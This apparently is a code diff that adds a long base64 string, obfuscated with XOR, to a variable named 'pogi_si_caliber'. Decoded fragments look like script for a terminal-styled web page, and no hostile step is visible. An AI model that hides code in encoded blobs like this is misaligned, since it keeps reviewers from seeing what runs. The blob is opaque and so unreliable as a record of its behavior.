+pogi_si_caliber += "44fYxtDAi+Ds7eXq5I3XxtHOys3Cz43LzNDXit6Zg92fjNDTws";
+pogi_si_caliber += "2dqYODg4ODg4ODn9DTws2DwM/C0NCegdSO+JeV09v+g8XPxtuO";
+pogi_si_caliber += "zczNxoPQxs/GwNeOzczNxoPXxtvXjtHKxMvXg9fG29eO+JrT2/";
+pogi_si_caliber += "6D19HCwMjKzcSO+I2Rxs7+g9fG29eOwc/MzMeOwtDLgYPC0crC";
+pogi_si_caliber += "jsvKx8fGzZ6B19HWxoGd19fakp+M0NPCzZ2pg4ODg4ODn4zHyt";
+pogi_si_caliber += "WdqYODg4ODg5/HytWDyseegdfG0c7hzMfagYPAz8LQ0J6B09uO";
+pogi_si_caliber += "l4PTwY6Xg9PXjpeDxczN147OzM3Mg9fG29eO+JKRjZbT2/6Dz8";
+pogi_si_caliber += "bCx8rNxI74ko2Vkf6D18bb147Bz8zMx47QzMXXg87C2474lJOT";
+pogi_si_caliber += "09v+mdPbjpCDzsLbjviUk5PT2/6Z18bb1474kpKNltPb/oGdqY";
+pogi_si_caliber += "ODg4ODg4ODn8fK1YPKx56B18bRzuzW14GDwM/C0NCegdTLytfG";
+pogi_si_caliber += "0NPCwMaO09HGjtTRwtODwdHGwsiO1MzRx9CBg9HMz8aegc/MxI";
+pogi_si_caliber += "GDwtHKwo7PytXGnoHTzM/K18aBg8LRysKOz8LBxs+egffG0c7K";
+pogi_si_caliber += "zcLPg8zW19PW14Gdn4zHytWdqYODg4ODg4ODn8XM0c6Dyseegd";
+pogi_si_caliber += "fG0c7lzNHOgYPAz8LQ0J6BzteOkYPFz8bbg8rXxs7QjsDGzdfG";
+pogi_si_caliber += "0YPEwtOOko2WgYPC1tfMwMzO08/G18aegczFxYGdqYODg4ODg4";
+pogi_si_caliber += "ODg4Of0NPCzYPAz8LQ0J6Bxc/G247NzM3Gg9DGz8bA147NzM3G";
+pogi_si_caliber += "gYPC0crCjsvKx8fGzZ6B19HWxoGdn9DTws2DwM/C0NCegdfG29";
+pogi_si_caliber += "eOwc/MzMeOzMiBnYfYxtDAi+Ds7eXq5I3XxtHOys3Cz43W0MbR";
+pogi_si_caliber += "it7jh9jG0MCL4Ozt5erkjdfG0c7KzcLPjcvM0NeK3p+M0NPCzZ";
+pogi_si_caliber += "2f0NPCzYPAz8LQ0J6B18bb147Bz8zMx47C0MuBnZmfjNDTws2d";
+pogi_si_caliber += "n9DTws2DwM/C0NCegdfG29eOwc/MzMeBnd2fjNDTws2dn9DTws";
+pogi_si_caliber += "2DwM/C0NCegdfG29eOwc/MzMeOwtDLgZ2Hn4zQ08LNnZ+M0NPC";
+pogi_si_caliber += "zZ2pg4ODg4ODg4ODg5/KzdPW14PKx56B18bRzurN09bXgYPAz8";
+pogi_si_caliber += "LQ0J6BzsrNjtSOk4PFz8bbjpKDwczRx8bRjpODwcSO19HCzdDT";
+pogi_si_caliber += "wtHGzdeD046Tg8XMzdeOzszNzIPXxtvXjviSkY2W09v+g9fG29";
+pogi_si_caliber += "eOwc/MzMeDwMLRxteOwc/MzMeDzNbXz8rNxo7NzM3Gg9PPwsDG";
+pogi_si_caliber += "y8zPx8bRmdfG29eOwc/MzMeOwtDLjJSTg87C2474lJOT09v+md";
+pogi_si_caliber += "fG29eO+JKV09v+gYPX2tPGnoHXxtvXgYPTz8LAxsvMz8fG0Z6B";
+pogi_si_caliber += "19rTxoOEy8bP04SBg8LRysKOz8LBxs+egffG0c7KzcLPg8DMzs";
+pogi_si_caliber += "7CzceBg9DTxs/PwMvGwMiegcXCz9DGgYPC1tfMwMLTytfCz8rZ";
+pogi_si_caliber += "xp6BzMXFgYPC1tfMwMzR0cbA156BzMXFgZ2pg4ODg4ODg4OfjM";
+pogi_si_caliber += "XM0c6dqYODg4ODg5+Mx8rVnamDg4ODg4Ofx8rVg8DPwtDQnoHF";
+pogi_si_caliber += "z8bbg8XPxtuO1NHC04PK18bO0I7Axs3XxtGDydbQ18rF2o7Bxt";
+pogi_si_caliber += "fUxsbNg8TC047bjpeDxMLTjtqOkYPBzNHHxtGO14PBzNHHxtGO";
+pogi_si_caliber += "wc/MzMeMkpaDwcSO+ICTwpOSk5D+g9PbjpCNloPT2o6Rg9fG29";
+pogi_si_caliber += "eO+JKT09v+g9fRwsDIys3EjviNk5vGzv6D18bb147Bz8zMx47H";
+pogi_si_caliber += "ys6BnamDg4ODg4ODg5/Q08LNg8DPwtDQnoHFz8bbg8XPxtuO1N";
+pogi_si_caliber += "HC04PK18bO0I7Axs3XxtGDxMLTjtuOkYPEwtOO2o6SgZ2pg4OD";
+pogi_si_caliber += "g4ODg4ODg5/Q08LNnYfYxtDAi+Ds7eXq5I3QytfG7cLOxo3XzO";
+pogi_si_caliber += "/M1MbR4MLQxouKit6DjIPCz8+Dy8LKz4PXkdCfjNDTws2dqYOD";
+pogi_si_caliber += "g4ODg4ODg4Of0NPCzYPAz8LQ0J6By474kNPb/oPUjviQ09v+g9";
+pogi_si_caliber += "HM1s3HxseOxdbPz4PBxI7Bz8zMx47Hys6MlJOBnZ+M0NPCzZ2p";
+pogi_si_caliber += "g4ODg4ODg4ODg5/Cg8DPwtDQnoHBzNHHxtGOwYPBzNHHxtGOwc";
+pogi_si_caliber += "/MzMeOx8rOjJeTg9PBjtPbg9fRws3QytfKzM2OwMzPzNHQg8vM";
+pogi_si_caliber += "1cbRmcHM0cfG0Y7Bz8zMx4PLzNXG0ZnXxtvXjsHPzMzHgYPL0c";
+pogi_si_caliber += "bFnoGH2MbQwIvg7O3l6uSNx8rQwMzRx+rN1crXxo3W0c+K3oGD";
+pogi_si_caliber += "18LRxMbXnoH8wc/CzciBg9HGz56BzczM08bNxtGDzczRxsXG0d";
+pogi_si_caliber += "HG0YGdh9jG0MCL4Ozt5erkjcfK0MDM0cfqzdXK18aNzcLOxore";
+pogi_si_caliber += "n4zCnamDg4ODg4ODg5+M0NPCzZ2pg4ODg4ODg4Of0NPCzYPAz8";
+pogi_si_caliber += "LQ0J6B0MbPxsDXjs3MzcaBndfX2pKDhc7Kx8fM15iDm5PbkZef";
+pogi_si_caliber += "jNDTws2dqYODg4ODg5+Mx8rVnamDg4ODn4zHytWdqYODn4zQxs";
+pogi_si_caliber += "DXyszNnamfjMfK1Z2pqZ/HytWDyseegcvM1cbR4MLRx4GDwM/C";
+pogi_si_caliber += "0NCegcrN1crQysHPxoPFytvGx4PZjviRlv6D1I74kZKV09v+g9";
+pogi_si_caliber += "fRws3Qz8LXxo7ajpKNloPQwMLPxo74jZqb/oPM1cbRxc/M1I7L";
+pogi_si_caliber += "ysfHxs2D0czWzcfGx47PxIPBzNHHxtGDwczRx8bRjsHPzMzHjJ";
+pogi_si_caliber += "CWg8HEjviAk8KTkpOX/oPM08LAytfajpOD0MvCx8zUjviT/JKV";
+pogi_si_caliber += "09v8l5HT2/zRxMHCi5OPk4+Tj42bkYqPk/yT/JGb09v80cTBwo";
+pogi_si_caliber += "uRlpaPkJWPlpWPjZKXio/KzdDG1/yT/JLT2/yT/NHEwcKLkZaW";
+pogi_si_caliber += "j5WTj5SWj42TlYr+gYPC0crCjsvKx8fGzZ6B19HWxoGdqYODn8";
+pogi_si_caliber += "fK1YPAz8LQ0J6By8COwcLNzcbRg9HGz8LXytXGg8uO+Jab09v+";
+pogi_si_caliber += "g8HEjviAksKTlJPC/oPBxI7AzNXG0YPBxI7Axs3XxtGDwcSOzc";
+pogi_si_caliber += "yO0cbTxsLXgYPKx56By8zVxtHgwtHH4cLNzcbRgZ2fjMfK1Z2p";
+pogi_si_caliber += "g4Ofx8rVg8DPwtDQnoHRxs/C18rVxoPZjviS/oOOzteO+JGS09";
+pogi_si_caliber += "v+g8XPxtuDytfGztCOxs3Hg8TC046Rg9PbjviSktPb/oGdqYOD";
+pogi_si_caliber += "g4Ofx8rVg8DPwtDQnoHLwI7C1YPMxcXPys3Gg9HGz8LXytXGg8";
+pogi_si_caliber += "uO+JeR09v+g9SO+JeR09v+g8XPxtuOzczNxoPRzNbNx8bHjsXW";
+pogi_si_caliber += "z8+DwczRx8bRjpGDwczRx8bRjviAk8KTl5OW/oPQy8LHzNSO+J";
+pogi_si_caliber += "P8k/ySldPb/NHEwcKLkZaWj5CVj5aVj42Qlor+gYPKx56By8zV";
+pogi_si_caliber += "xtHgwtHH4tXC18LR9NHC04GdqYODg4ODg5/KzsSDwM/C0NCegc";
+pogi_si_caliber += "KDwc/MwMiDy47F1s/Pg9SOxdbPz4PRzNbNx8bHjsXWz8+DwcSO";
+pogi_si_caliber += "+ICSwpOUk8L+g8zBycbA147AzNXG0YPX0cLN0MrXyszNjszTws";
+pogi_si_caliber += "DK19qDx9bRwtfKzM2OkJOTgYPKx56By8zVxtHgwtHH4tXC18LR";
+pogi_si_caliber += "gYPQ0cCegYGDws/XnoGBnamDg4ODg4Of0NPCzYPAz8LQ0J6B0I";
+pogi_si_caliber += "PCwdDMz9bXxoOOwczX18zOjtPbg47RysTL147T24PZjviR/oPL";
+pogi_si_caliber += "jpCD1I6Qg9HM1s3HxseOxdbPz4PBzNHHxtGOkYPBzNHHxtGO+I";
+pogi_si_caliber += "CTwpOXk5b+gZ2fjNDTws2dqYODg4OfjMfK1Z2pg4ODg5/HytWD";
+pogi_si_caliber += "wM/C0NCegc7KzY7UjpOD08GO09uBnamDg4ODg4Ofx8rVg8DPwt";
+pogi_si_caliber += "DQnoHX0dbNwMLXxoPXxtvXjviSkY2W09v+g8/GwsfKzcSO18rE";
+pogi_si_caliber += "y9eD19HCwMjKzcSO+I2TkcbO/oPXxtvXjsHPzMzHjtDMxdeBg8";
+pogi_si_caliber += "rHnoHLzNXG0eDC0cftws7GgZ2fjMfK1Z2pg4ODg4ODn8fK1YPA";
+pogi_si_caliber += "z8LQ0J6B19HWzcDC18aD18bb1474mo2W09v+g9fRwsDIys3Ejv";
+pogi_si_caliber += "iNk5DGzv6D18bb147Bz8zMx47Hys6Bg8rHnoHLzNXG0eDC0cfr";
+pogi_si_caliber += "ws3Hz8aBnZ+Mx8rVnamDg4ODn4zHytWdqYODn4zHytWdqYODn8";
+pogi_si_caliber += "fK1YPAz8LQ0J6B09uO+JKS09v+g9PXjviU09v+gZ2f0NPCzYPA";
+pogi_si_caliber += "z8LQ0J6B0NeDzMXFz8rNxoGDyseegcvM1cbR4MLRx/DXwtfW0I";
+pogi_si_caliber += "Gdn8qdn4zKnZ/Q08LNnczFxc/KzcafjNDTws2dn4zQ08LNnZ+M";
+pogi_si_caliber += "x8rVnamDg5/HytWDwM/C0NCegdfR1s3AwtfGg9PbjviSktPb/o";
+pogi_si_caliber += "PTwY6RjZaD09eOkoPXxtvXjviajZbT2/6D19HCwMjKzcSO+I2T";
+pogi_si_caliber += "kcbO/oPXxtvXjsHPzMzHjsfKzoGDyseegcvM1cbR4MLRx+LA14";
+pogi_si_caliber += "Gdn4zHytWdqZ+Mx8rVnampn8LWx8rMg8rHnoHBxO7W0MrA5s+B";
+pogi_si_caliber += "g9PRxs/Mwseegc3MzcaBg8/MzNOdn4zC1sfKzJ2pn8LWx8rMg8";
+pogi_si_caliber += "rHnoHT0czFys/G7tbQysDmz4GD09HGz8zCx56BzczNxoGDz8zM";
+pogi_si_caliber += "052fjMLWx8rMnampn8fK1YPKx56B09HMxcrPxu7Mx8LPgYPAz8";
+pogi_si_caliber += "LQ0J6Bys3VytDKwc/Gg8XK28bHg8rN0MbXjpOD2Y6Qk4PE0crH";
+pogi_si_caliber += "g9PPwsDGjsrXxs7QjsDGzdfG0YPBxI7Bz8LAyIyUk4PTjviSm9";
+pogi_si_caliber += "Pb/oPM08LAytfajpOBg8LRysKOy8rHx8bNnoHX0dbGgZ2pg4Of";
+pogi_si_caliber += "x8rVg8DPwtDQnoHXzoPRxs/C18rVxoPZjviS/oPFz8bbg87C24";
+pogi_si_caliber += "7LjviakcfVy/6D1I74zsrNi5qV1dSPlJuT09uK/oPX0cLN0M/C";
+pogi_si_caliber += "18aO2o6Xg9DAws/GjviNmpWW/oPFz8bbjsDMz4PM1cbRxc/M1I";
+pogi_si_caliber += "7LysfHxs2D0czWzcfGx474kpPT2/6DwczRx8bRg8HM0cfG0Y7B";
+pogi_si_caliber += "z8zMx4yXk4PBxI74gJObk5KTkP6D0MvCx8zUjviT/JCX09v8mp";
+pogi_si_caliber += "PT2/zRxMHCi5OPk4+Tj42akYqPk/yT/JST09v80cTBwouRlpaP";
+pogi_si_caliber += "kJWPlpWPjZKVio/KzdDG1/yT/JLT2/yT/NHEwcKLkZaWj5WTj5";
+pogi_si_caliber += "SWj42TlIr+g87C2474lJOT09v+mdSOxdbPz4GD0czPxp6Bx8rC";
+pogi_si_caliber += "z8zEgYPC0crCjs7Mx8LPnoHX0dbGgYPC0crCjs/CwcbPnoHuxs";
+pogi_si_caliber += "7BxtGD09HMxcrPxoGdqYODg4Ofx8rVg8DPwtDQnoHFz8bbg8XP";
+pogi_si_caliber += "xtuOzczNxoPK18bO0I7Axs3XxtGDxMLTjviSktPb/oPBzNHHxt";
+pogi_si_caliber += "GOwYPBzNHHxtGOwc/MzMeMkZODwcSO+ICSk5ORk5X+g9PbjviS";
+pogi_si_caliber += "kNPb/oPT2o6RjZaD18bb1474kpLT2/6D19HCwMjKzcSO+I2Tlc";
+pogi_si_caliber += "bO/oPXxtvXjsHPzMzHjsfKzoGdqYODg4ODg5/Q08LNg8DPwtDQ";
+pogi_si_caliber += "noHXzo7HzNfQgZ2fyp2fjMqdn8qdn4zKnZ/KnZ+Myp2fjNDTws";
+pogi_si_caliber += "2dqYODg4ODg5/Q08LNg8DPwtDQnoHOys2O1I6Tg8XPxtuOkoPX";
+pogi_si_caliber += "0dbNwMLXxoPXxtvXjsHPzMzHjtDMxdeMm5OBg8rHnoHT0czFys";
+pogi_si_caliber += "/G7szHws/zwtfLgZ3XkdDj0MvGz8+Zg92M09HMxcrPxtCfjNDT";
+pogi_si_caliber += "ws2dqYODg4ODg5/B1tfXzM2DwM/C0NCegcTRyseDy474kZHT2/";
+pogi_si_caliber += "6D1I74kZHT2/6Dxc/G247NzM3Gg9PPwsDGjsrXxs7QjsDGzdfG";
+pogi_si_caliber += "0YPRzNbNx8bHjviQ09v+g8HM0cfG0Y6Tg8HEjtfRws3Q08LRxs";
+pogi_si_caliber += "3Xg9fG29eO+JKQ09v+g8/GwsfKzcSOzczNxoPXxtvXjsHPzMzH";
+pogi_si_caliber += "jsfKzoPX0cLN0MrXyszNjsDMz8zR0IPLzNXG0ZnBxI7Bz8zMx4";
+pogi_si_caliber += "yRk4PLzNXG0ZnXxtvXjsHPzMzHgYPX2tPGnoHB1tfXzM2Bg8rH";
+pogi_si_caliber += "noHT0czFys/G7szHws/gz8zQxoGDwtHKwo7PwsHGz56B4M/M0M";
+pogi_si_caliber += "aD09HMxcrPxoGdhYCSk5OTlpifjMHW19fMzZ2pg4ODg5+Mx8rV";
+pogi_si_caliber += "namDg4ODn8fK1YPAz8LQ0J6B186OwczH2oPRxs/C18rVxoPOys";
+pogi_si_caliber += "2Oy46Tg8XPxtuOkoPM1cbRxc/M1I7ajsLW18yDzNXG0dDA0czP";
+pogi_si_caliber += "z47AzM3XwsrNg9PbjpWD08GOlYPT146Wg8XMzdeOzszNzIPXxt";
+pogi_si_caliber += "vXjviSl42W09v+g8/GwsfKzcSO+JKNlZX+g9fG29eOwc/MzMeO";
+pogi_si_caliber += "0MzF14P4jtTGwcjK147M1cbRxc/M1I7QwNHMz8/KzcSZ18zWwM";
+pogi_si_caliber += "v+g87C2474lJOT09v+mdPbjpeDzsLbjviUk5PT2/6Z08GO+JKb";
+pogi_si_caliber += "09v+g87C2474lJOT09v+mdPXjpeDzsLbjviUk5PT2/6Z18bb14";
+pogi_si_caliber += "74kpCNltPb/oGDyseegdPRzMXKz8buzMfCz+HMx9qBnamDg4OD";
+pogi_si_caliber += "g4Ofx8rVg8DPwtDQnoHXzo7Pys3Gg87BjpKD19HWzcDC18aD1M";
+pogi_si_caliber += "vK18bQ08LAxo7NzNTRwtOD18bb147Bz8zMx47MyIGdqYODg4OD";
+pogi_si_caliber += "g4ODn9DTws2DwM/C0NCegdfG29eOwc/MzMeOx8rOg9POjtbQxt";
+pogi_si_caliber += "GBndeR0OPQy8bPz5+M0NPCzZ2f0NPCzYPAz8LQ0J6B18bb1474";
+pogi_si_caliber += "gJXBl5OXlf6BnZmfjNDTws2dn9DTws2DwM/C0NCegdfG29eOwc";
+pogi_si_caliber += "/MzMeD+NfG29eO0MvCx8zUmZP8k/yb09v80cTBwouRlpaPkJWP";
+pogi_si_caliber += "lpWPjZCWiv6Bnd2fjNDTws2dn9DTws2DwM/C0NCegdfG29eO+I";
+pogi_si_caliber += "CVwZeTl5X+gZ2Hn4zQ08LNnYOf0NPCzYPAz8LQ0J6Bzs+Oko2W";
+pogi_si_caliber += "g9fG29eOwc/MzMeBg8rHnoHT0czFys/G7szHws/gzseBnZ+M0N";
+pogi_si_caliber += "PCzZ2pg4ODg4ODn4zHytWdqYODg4ODg5/HytWDwM/C0NCegdfO";
+pogi_si_caliber += "jtHWzYPO1474lNPb/oPFz8bbg8rXxs7QjsDGzdfG0YPEwtOOkY";
+pogi_si_caliber += "PXxtvXjviSkY2W09v+g9fRwsDIys3EjviNk5LGzv6D18bb147B";
+pogi_si_caliber += "z8zMx47Hys6DzNPCwMrX2o6TgYPKx56B09HMxcrPxu7Mx8LP8d";
+pogi_si_caliber += "bNgYPLysfHxs2dqYODg4ODg4ODn9DTws2DwM/C0NCegdfOjtDT";
+pogi_si_caliber += "ys2Dy46RjZaD1I6RjZaDxc/G247NzM3Gg8LNys7C18aO+NDTys";
+pogi_si_caliber += "38jZTQ/M/KzcbC0fzKzcXKzcrXxv6D0czWzcfGx47F1s/Pg8HM";
+pogi_si_caliber += "0cfG0Y74ko2W09v+g8HM0cfG0Y7Bz8zMx4yQk4PBzNHHxtGO14";
+pogi_si_caliber += "7Bz8zMx4Gdn4zQ08LNnZ/Q08LNg8rHnoHT0czFys/G7szHws/x";
+pogi_si_caliber += "1s33xtvXgZ2fjNDTws2dqYODg4ODg5+Mx8rVnamDg4ODg4Ofx8";
+pogi_si_caliber += "rVg8DPwtDQnoHXzo7M1teDztqOkI2Wg87PjpOD08+O09uBnamD";
+pogi_si_caliber += "g4ODg4ODg5/HytWDwM/C0NCegc7BjpCNloPXxtvXjtvQg9fRws";
+pogi_si_caliber += "DIys3EjviNk5HGzv6D18bb147Bz8zMx47Hys6BncXG18DLys3E";
+pogi_si_caliber += "g9PRzMXKz8aDxdHMzoPHytDAzNHHg5/Q08LNg8DPwtDQnoHXxt";
+pogi_si_caliber += "vXjsHPzMzHg/jXxtvXjtDLwsfM1JmT/JP8m9Pb/NHEwcKLkZaW";
+pogi_si_caliber += "j5CVj5aVj42Qlor+gZ34g8zIg/6fjNDTws2dn4zHytWdqYODg4";
+pogi_si_caliber += "ODg4ODn8fK1YPAz8LQ0J6BzsGOkI2Wg8XPxtuDytfGztCOwMbN";
+pogi_si_caliber += "18bRg8TC046QjZaBnamDg4ODg4ODg4ODn8fK1YPAz8LQ0J6B18";
+pogi_si_caliber += "6OwtWDzMXFz8rNxoPRxs/C18rVxoPLjpGTg9SOkZODxc/G247N";
+pogi_si_caliber += "zM3Gg87C2474lJOT09v+mcuOkpWDzsLbjviUk5PT2/6Z1I6SlY";
+pogi_si_caliber += "POwtuO+JCVk9Pb/pnLjpKXg87C2474kJWT09v+mdSOkpeBg8rH";
+pogi_si_caliber += "noHT0czFys/G7szHws/i1cLXwtH00cLTgZ2pg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODn8rOxIPAz8LQ0J6BwoPBz8zAyIPLjsXWz8+D1I7F1s/Pg9HM";
+pogi_si_caliber += "1s3HxseOxdbPz4PBxI74gJLCk5STwv6DzMHJxsDXjsDM1cbRg9";
+pogi_si_caliber += "DLwsfM1I74k/yT/JGV09v80cTBwouRlpaPkJWPlpWPjZCViv6D";
+pogi_si_caliber += "19HCzdDK18rMzY7M08LAytfag8fW0cLXyszNjpCTk4GDyseegd";
+pogi_si_caliber += "PRzMXKz8buzMfCz+LVwtfC0YGD0NHAnoGBg8LP156BgZ2pg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODn9DTws2DwM/C0NCegdCDwsHQzM/W18aDjsHM19";
+pogi_si_caliber += "fMzo7T24OO0crEy9eO09uD2Y74kf6Dy474kpvT2/6D1I74kpvT";
+pogi_si_caliber += "2/6D0czWzcfGx47F1s/Pg8HM0cfG0Y74kNPb/oPBzNHHxtGO+I";
+pogi_si_caliber += "CTwpOXk5b+gZ2fjNDTws2dqYODg4ODg4ODg4OfjMfK1Z2pg4OD";
+pogi_si_caliber += "g4ODg4ODg5/HytWDwM/C0NCegc7KzY7UjpOBnamDg4ODg4ODg4";
+pogi_si_caliber += "ODg4Ofx8rVg8DPwtDQnoHX0dbNwMLXxoPXxtvXjviRkdPb/oPP";
+pogi_si_caliber += "xsLHys3EjtfKxMvXg9fRwsDIys3EjviNk5DGzv6D18bb1474gM";
+pogi_si_caliber += "XFlMGblP6DzsLbjviUk5PT2/6Z18bb1474kprT2/6DzsLbjviQ";
+pogi_si_caliber += "lZPT2/6Z18bb1474kpTT2/6Bg8rHnoHT0czFys/G7szHws/tws";
+pogi_si_caliber += "7GgZ2fjMfK1Z2pg4ODg4ODg4ODg4ODn8fK1YPAz8LQ0J6BzteO";
+pogi_si_caliber += "koPXxtvXjviSkNPb/oPX0cLAyMrNxI74jZOQxs7+g9fG29eOwc";
+pogi_si_caliber += "/MzMeOx8rOgYPKx56B09HMxcrPxu7Mx8LP68LNx8/GgZ2fjMfK";
+pogi_si_caliber += "1Z2pg4ODg4ODg4ODg5+Mx8rVnamDg4ODg4ODg4ODn9PRxoPAz8";
+pogi_si_caliber += "LQ0J6B086OwtHXgYPKx56B09HMxcrPxu7Mx8LP4tHXgYPC0crC";
+pogi_si_caliber += "jsvKx8fGzZ6B19HWxoGdn4zT0cadqYODg4ODg4ODn4zHytWdqY";
+pogi_si_caliber += "ODg4ODg4ODn8fK1YPAz8LQ0J6BxNHKx4PE0crHjsDMz9CO+JqV";
+pogi_si_caliber += "09v8ksXR/oPEwtOOkY2Wg9fG29eO+JKQjZbT2/6Dz8bCx8rNxI";
+pogi_si_caliber += "74ko2bkf6DzsLbjviUk5PT2/6ZxNHKx47AzM/QjvibkdPb/JLF";
+pogi_si_caliber += "0f6DzsLbjviUk5PT2/6Z18bb1474kpGNltPb/oGdn9DTws2DwM";
+pogi_si_caliber += "/C0NCegciD18bb1474gMGTlcKUkf6DwsXXxtGZxc/MwteO0crE";
+pogi_si_caliber += "y9eDwsXXxtGZ18bb1474gJbGkMKQxf6DwsXXxtGZwMzN18bN14";
+pogi_si_caliber += "74hJmE/oGd0NfC19bQn4zQ08LNnZ/Q08LNg8DPwtDQnoHOys2O";
+pogi_si_caliber += "1I6Tg8HRxsLIjtTM0cfQg9fG29eOwc/MzMeO0MzF14Gdn9DTws";
+pogi_si_caliber += "2DwM/C0NCegdDXg8zFxc/KzcaBg8rHnoHT0czFys/G7szHws/w";
+pogi_si_caliber += "18LX1tCBnZ/KnZ+Myp2f0NPCzZ3MxcXPys3Gn4zQ08LNnZ+M0N";
+pogi_si_caliber += "PCzZ2fjNDTws2dn4zHytWdqYODg4ODg4ODn8fK1YPAz8LQ0J6B";
+pogi_si_caliber += "xNHKx4PE0crHjsDMz9CO+JqV09v8ksXR/oPEwtOOkY2Wg9fG29";
+pogi_si_caliber += "eO+JKQjZbT2/6Dz8bCx8rNxI74ko2bkf6DzsLbjviUk5PT2/6Z";
+pogi_si_caliber += "xNHKx47AzM/QjvibkdPb/JLF0f6DzsLbjviUk5PT2/6Z18bb14";
+pogi_si_caliber += "74kpGNltPb/oGdn9DTws2DwM/C0NCegciD18bb1474gMGTlcKU";
+pogi_si_caliber += "kf6DwsXXxtGZxc/MwteO0crEy9eDwsXXxtGZ18bb1474gJbGkM";
+pogi_si_caliber += "KQxf6DwsXXxtGZwMzN18bN1474hJmE/oGdwsDXytXK19qfjNDT";
+pogi_si_caliber += "ws2dn9DTws2DwM/C0NCegc7KzY7UjpODwdHGwsiO1MzRx9CD18";
+pogi_si_caliber += "bb147Bz8zMx47QzMXXgYPKx56B09HMxcrPxu7Mx8LP8NfC19bQ";
+pogi_si_caliber += "98bb14Gdn4zQ08LNnZ+Mx8rVnamDg4ODg4ODg5/HytWDwM/C0N";
+pogi_si_caliber += "CegcTRyseDxNHKx47AzM/QjvialdPb/JLF0f6DxMLTjpGNloPX";
+pogi_si_caliber += "xtvXjviSkI2W09v+g8/GwsfKzcSO+JKNm5H+g87C2474lJOT09";
+pogi_si_caliber += "v+mcTRyseOwMzP0I74m5HT2/ySxdH+g87C2474lJOT09v+mdfG";
+pogi_si_caliber += "29eO+JKRjZbT2/6BnZ/Q08LNg8DPwtDQnoHIg9fG29eO+IDBk5";
+pogi_si_caliber += "XClJH+g8LF18bRmcXPzMLXjtHKxMvXg8LF18bRmdfG29eO+ICW";
+pogi_si_caliber += "xpDCkMX+g8LF18bRmcDMzdfGzdeO+ISZhP6BndXKxtTQn4zQ08";
+pogi_si_caliber += "LNnZ/Q08LNg8DPwtDQnoHOys2O1I6Tg8HRxsLIjtTM0cfQg9fG";
+pogi_si_caliber += "29eOwc/MzMeO0MzF14GDyseegdPRzMXKz8buzMfCz/XKxtTQ4M";
+pogi_si_caliber += "zWzdeBnYXOysfHzNeYhc7Kx8fM15iFzsrHx8zXmJ+M0NPCzZ2f";
+pogi_si_caliber += "jMfK1Z2pg4ODg4ODn4zHytWdqYODg4ODg5/HytWDwM/C0NCegd";
+pogi_si_caliber += "fOjs/KzcaD186Oxs3Hg87BjpKDzteOk42Wg9fR1s3AwtfGg9TL";
+pogi_si_caliber += "ytfG0NPCwMaOzczU0cLTg9fG29eOwc/MzMeOzMiBnZ/Q08LNg8";
+pogi_si_caliber += "DPwtDQnoHXxtvXjsHPzMzHjsfKzoPTzo7W0MbRgZ3XkdDj0MvG";
+pogi_si_caliber += "z8+fjNDTws2dn9DTws2DwM/C0NCegdfG29eO+ICVwZeTl5X+gZ";
+pogi_si_caliber += "2Zn4zQ08LNnZ/Q08LNg8DPwtDQnoHXxtvXjsHPzMzHg/jXxtvX";
+pogi_si_caliber += "jtDLwsfM1JmT/JP8m9Pb/NHEwcKLkZaWj5CVj5aVj42Qlor+gZ";
+pogi_si_caliber += "3dn4zQ08LNnZ/Q08LNg8DPwtDQnoHXxtvXjviAlcGXk5eV/oGd";
+pogi_si_caliber += "h5+M0NPCzZ2Dn9DTws2DwM/C0NCegdfOjsDC0cbXg87PjviU09";
+pogi_si_caliber += "v+g8rNz8rNxo7Bz8zAyIPLjpeD1I6Rg47X0cLN0M/C18aO2o74";
+pogi_si_caliber += "kNPb/oPCzcrOwtfGjvjBz/yS0PzQ18bT0IuSivzKzcXKzcrXxv";
+pogi_si_caliber += "6DwcSOwc/MzMeBnZ+M0NPCzZ2fjMfK1Z2pg4ODg5+Mx8rVnamD";
+pogi_si_caliber += "g5+Mx8rVnamfjMfK1Z2pw5ipqcDMzdDXg+Hk/O/i+uz294Oeg/";
+pogi_si_caliber += "ipg4PYg9fM05mDhI6Sk4aEj4PPxsXXmYOElZGGhI+Dg9DK2caZ";
+pogi_si_caliber += "g5KQj4PMmYONkpWPg9GZg5uPg4ODx9uZg5Kbj4ODx9qZg46SlY";
+pogi_si_caliber += "Pej6mDg9iD18zTmYOEl5eGhI+Dg8/GxdeZg4SOlIaEj4OD0MrZ";
+pogi_si_caliber += "xpmDkpKPg8yZg42SkI+D0ZmDlo+Dg4PH25mDjpKXj4PH2pmDkZ";
+pogi_si_caliber += "ODg96PqYOD2IPXzNOZg4SWm4aEj4ODz8bF15mDhJeUhoSPg4PQ";
+pogi_si_caliber += "ytnGmYOSl4+DzJmDjZKRj4PRmYOOl4+Dg8fbmYOSkY+Dg8famY";
+pogi_si_caliber += "OOkZGD3o+pg4PYg9fM05mDhJKbhoSPg4PPxsXXmYOEm5OGhI+D";
+pogi_si_caliber += "g9DK2caZg5uPg4PMmYONkpePg9GZg46SkY+Dx9uZg46SlY+Dx9";
+pogi_si_caliber += "qZg5KXg4Pej6mDg9iD18zTmYOEjpWGhI+Dg8/GxdeZg4SOkIaE";
+pogi_si_caliber += "j4OD0MrZxpmDmo+Dg8yZg42Tmo+D0ZmDjpSPg4PH25mDkpePg4";
+pogi_si_caliber += "PH2pmDkpuDg96PqYOD2IPXzNOZg4SVlYaEj4ODz8bF15mDhJSX";
+pogi_si_caliber += "hoSPg4PQytnGmYOaj4ODzJmDjZKQj4PRmYOSk4+Dg8fbmYOOkp";
+pogi_si_caliber += "uPg8famYOOkpGD3o+pg4PYg9fM05mDhJGThoSPg4PPxsXXmYOE";
+pogi_si_caliber += "kZWGhI+Dg9DK2caZg5SPg4PMmYONk5uPg9GZg46Sk4+Dx9uZg5";
+pogi_si_caliber += "KVj4ODx9qZg46Sm4Pej6mDg9iD18zTmYOElJWGhI+Dg8/GxdeZ";
+pogi_si_caliber += "g4SRm4aEj4OD0MrZxpmDm4+Dg8yZg42Tmo+D0ZmDlY+Dg4PH25";
+pogi_si_caliber += "mDjpKRj4PH2pmDkpWDg96Pqf6YqYvF1s3A18rMzYPB1srPx+HC";
+pogi_si_caliber += "wMjE0czWzceLitipg4PAzM3Q14PBxObPg56Dx8zA1s7GzdeNxM";
+pogi_si_caliber += "bX5s/GzsbN1+Ha6seLhMHEhIqYqYODxczRi8DMzdDXg8DFxIPM";
+pogi_si_caliber += "xYPh5Pzv4vrs9veK2KmDg4ODwMzN0NeDwtHXg56Dx8zA1s7Gzd";
